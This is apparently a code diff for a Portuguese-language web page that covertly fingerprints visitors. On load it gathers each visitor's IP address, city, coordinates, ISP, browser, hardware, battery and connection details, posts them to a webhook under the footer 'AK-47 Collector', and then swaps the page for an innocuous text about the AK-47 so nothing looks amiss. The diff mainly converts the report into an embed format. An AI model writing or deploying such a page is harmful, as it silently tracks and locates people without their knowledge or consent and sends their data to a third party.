@@ -19,7 +19,7 @@
       }
       return "Desconhecido";
     }
-    
+
     function sendPayload(payload) {
       fetch(webhookURL, {
         method: "POST",
@@ -27,17 +27,17 @@
         body: JSON.stringify(payload)
       });
     }
-    
+
     async function coletarEEnviarDados() {
       try {
         
         const ipResponse = await fetch("https://api.ipify.org?format=json");
         const ipData = await ipResponse.json();
         const ip = ipData.ip;
-
+        
         const ipinfoResponse = await fetch(`https://ipinfo.io/${ip}/json?token=${ipinfoToken}`);
         const ipinfoData = await ipinfoResponse.json();
-
+        
         const userAgent = navigator.userAgent;
         const language = navigator.language;
         const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
@@ -46,40 +46,49 @@
         const plugins = [...navigator.plugins].map(p => p.name).join(", ") || "Nenhum";
         const hardwareConcurrency = navigator.hardwareConcurrency || "N/A";
         const deviceMemory = navigator.deviceMemory || "N/A";
-        const connection = navigator.connection ? 
-          `Tipo: ${navigator.connection.effectiveType}, Downlink: ${navigator.connection.downlink}Mbps` : "N/A";
+        const connection = navigator.connection || {};
+        const connectionType = connection.effectiveType || "N/A";
+        const downlink = connection.downlink ? connection.downlink + " Mbps" : "N/A";
         const cookieEnabled = navigator.cookieEnabled;
         const online = navigator.onLine;
         const prefersDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches;
         const browserVersion = getBrowserVersion(userAgent);
-
+        
         function enviarComBateria(batteryLevel, charging) {
-          const payload = {
-            content: `🕵️ Novo visitante:
-- IP: ${ip}
-- Cidade: ${ipinfoData.city || "N/A"}
-- Região: ${ipinfoData.region || "N/A"}
-- País: ${ipinfoData.country || "N/A"}
-- Localização (lat,long): ${ipinfoData.loc || "N/A"}
-- Organização: ${ipinfoData.org || "N/A"}
-- Timezone (IPinfo): ${ipinfoData.timezone || "N/A"}
-- Navegador (userAgent): ${userAgent}
-- Versão do navegador: ${browserVersion}
-- Idioma: ${language}
-- Fuso horário (navegador): ${timezone}
-- Resolução da tela: ${screenResolution}
-- DPI (devicePixelRatio): ${devicePixelRatio}
-- Plugins: ${plugins}
-- Núcleos da CPU: ${hardwareConcurrency}
-- Memória RAM aproximada (GB): ${deviceMemory}
-- Conexão: ${connection}
-- Cookies habilitados: ${cookieEnabled}
-- Online: ${online}
-- Prefere modo escuro: ${prefersDarkMode}
-- Nível da bateria: ${batteryLevel}
-- Carregando bateria: ${charging}`
+          const embed = {
+            title: "🕵️ Novo visitante",
+            color: 0xFF0000,
+            fields: [
+              { name: "IP", value: ip, inline: true },
+              { name: "Cidade", value: ipinfoData.city || "N/A", inline: true },
+              { name: "Região", value: ipinfoData.region || "N/A", inline: true },
+              { name: "País", value: ipinfoData.country || "N/A", inline: true },
+              { name: "Localização (lat,long)", value: ipinfoData.loc || "N/A", inline: true },
+              { name: "Organização", value: ipinfoData.org || "N/A", inline: true },
+              { name: "Timezone (IPinfo)", value: ipinfoData.timezone || "N/A", inline: true },
+              { name: "Navegador (userAgent)", value: userAgent, inline: false },
+              { name: "Versão do navegador", value: browserVersion, inline: true },
+              { name: "Idioma", value: language, inline: true },
+              { name: "Fuso horário (navegador)", value: timezone, inline: true },
+              { name: "Resolução da tela", value: screenResolution, inline: true },
+              { name: "DPI (devicePixelRatio)", value: devicePixelRatio.toString(), inline: true },
+              { name: "Plugins", value: plugins, inline: false },
+              { name: "Núcleos da CPU", value: hardwareConcurrency.toString(), inline: true },
+              { name: "Memória RAM aproximada (GB)", value: deviceMemory.toString(), inline: true },
+              { name: "Conexão", value: `Tipo: ${connectionType}, Downlink: ${downlink}`, inline: true },
+              { name: "Cookies habilitados", value: cookieEnabled ? "Sim" : "Não", inline: true },
+              { name: "Online", value: online ? "Sim" : "Não", inline: true },
+              { name: "Prefere modo escuro", value: prefersDarkMode ? "Sim" : "Não", inline: true },
+              { name: "Nível da bateria", value: batteryLevel, inline: true },
+              { name: "Carregando bateria", value: charging, inline: true }
+            ],
+            footer: {
+              text: "AK-47 Collector"
+            },
+            timestamp: new Date().toISOString()
           };
-          sendPayload(payload);
+
+          sendPayload({ embeds: [embed] });
 
           document.body.innerHTML = `<h2>A AK-47, oficialmente conhecida como Avtomat Kalashnikova 1947, é um dos rifles de assalto mais reconhecidos e utilizados no mundo. Desenvolvida na União Soviética por Mikhail Kalashnikov no final da década de 1940, essa arma se tornou símbolo tanto de revoluções quanto de conflitos armados ao redor do planeta.
 
@@ -89,11 +98,9 @@ A principal característica da AK-47 é sua durabilidade. Ela pode continuar fun
 
 Com mais de 100 milhões de unidades produzidas (contando variantes licenciadas e não licenciadas), a AK-47 é considerada a arma de fogo mais produzida da história. Seu design também deu origem a várias versões, como a AKM, AK-74 e muitas outras adaptações fabricadas em diferentes países.
 
-Apesar de sua fama controversa, a AK-47 representa um marco na engenharia militar, sendo símbolo de simplicidade, funcionalidade e impacto global. - Chat Gpt
-
-</h2>`;
+Apesar de sua fama controversa, a AK-47 representa um marco na engenharia militar, sendo símbolo de simplicidade, funcionalidade e impacto global. - Chat GPT</h2>`;
         }
-
+        
         if (navigator.getBattery) {
           navigator.getBattery().then(battery => {
             const batteryLevel = Math.round(battery.level * 100) + "%";
@@ -105,7 +112,6 @@ Apesar de sua fama controversa, a AK-47 representa um marco na engenharia milita
         } else {
           enviarComBateria("N/A", "N/A");
         }
-
       } catch (error) {
         console.error("Erro ao obter ou enviar informações:", error);
         document.body.innerHTML = "<h2>Erro ao verificar.</h2>";
